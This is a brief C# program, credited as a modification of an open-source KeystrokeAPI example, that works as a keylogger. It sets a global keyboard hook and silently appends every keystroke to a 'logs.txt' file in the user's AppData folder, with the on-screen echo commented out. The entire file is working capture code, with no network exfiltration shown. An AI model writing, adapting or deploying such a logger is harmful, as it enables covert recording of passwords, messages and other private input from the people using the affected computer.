/* 
 * Code initial : https://github.com/fabriciorissetto/KeystrokeAPI#readme
 * Modifié par  : Gwendoline Dossegger
 * Date			: 20.07.2022
*/
using Keystroke.API;
using System;
using System.Windows.Forms;
using System.IO;
namespace ConsoleApplicationTest
{
	class Program
	{
		private static string buffer = "";
		static int Main(string[] args)
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			string LOG_FILE_NAME = args.Length >= 1 ? args[0] : path+@"\logs.txt";
			using (var api = new KeystrokeAPI())
			{
				api.CreateKeyboardHook((character) => {

					StreamWriter output = new StreamWriter(LOG_FILE_NAME, true);
					buffer += character;
					output.Write(buffer);
					output.Close();
					//Console.Write(character); Si besoin d'afficher le caractère dans la console
					buffer = "";

				});
				Application.Run();
			}
			return 0;
		}
	}
}
